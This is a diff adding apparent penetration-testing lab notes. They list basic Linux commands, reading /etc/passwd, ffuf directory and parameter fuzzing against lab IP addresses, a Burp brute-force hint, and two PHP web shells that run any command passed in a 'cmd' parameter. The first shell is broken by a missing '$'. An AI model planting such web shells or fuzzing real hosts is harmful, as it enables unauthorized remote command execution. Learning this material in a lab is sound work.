@@ -1,0 +1,56 @@
+ls -al
+ls -al /var/www/html/
+grep -i
+cat /etc/passwd
+chmod 777 0
+echo "" >a.txt
+su Username
+
+sudo -s
+sudo systemstl start/stop/restart apache2/mysql
+sudo reboot
+sudo shutdown now
+
+grep -i /usr/share/wordlists/dirb/big.txt (check txt file cmd)
+grep -i (wanted file) / checking filelocation.txt
+
+ls -al /usr/share/wordlists
+ls -al /usr/share/wordlists/dirb/big.txt
+ls -al /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+
+ffuf -w /usr/share/wordlists/dirb/big.txt -u http://192.168.100.32/FUZZ -v 
+
+ffuf -w /usr/share/wordlists/dirb/big.txt -u http://192.168.100.32/FUZZ.txt
+
+ffuf -w /usr/share/wordlists/dirb/big.txt -u http://146.190.89.205/lab2/FUZZ.php -v
+
+ffuf -w /usr/share/wordlists/dirb/big.txt -u http://192.168.100.32/test/shell.php?FUZZ=ls (or) ls al
+
+ffuf -w /usr/share/wordlists/dirb/big.txt -u http://192.168.100.32/test/shell.php?FUZZ=ls -fw 2  
+
+-fw(words)
+-fs(size)
+
+echo "Zip is secret" > backup.zip
+sudo gunzip / file dir.gz
+
+<?php
+echo "<pre>";
+$cmd= $_GET['cmd'];
+if(isset ($cmd)){
+	system(cmd);
+}
+?>
+
+<?php
+echo "<pre>";
+
+if(isset ($_GET['cmd'])){
+	system($_GET['cmd']);
+}
+?>
+
+
+##Burp-bruteforce
+
+Proxy(http history) to repeater and change req method (POST)  
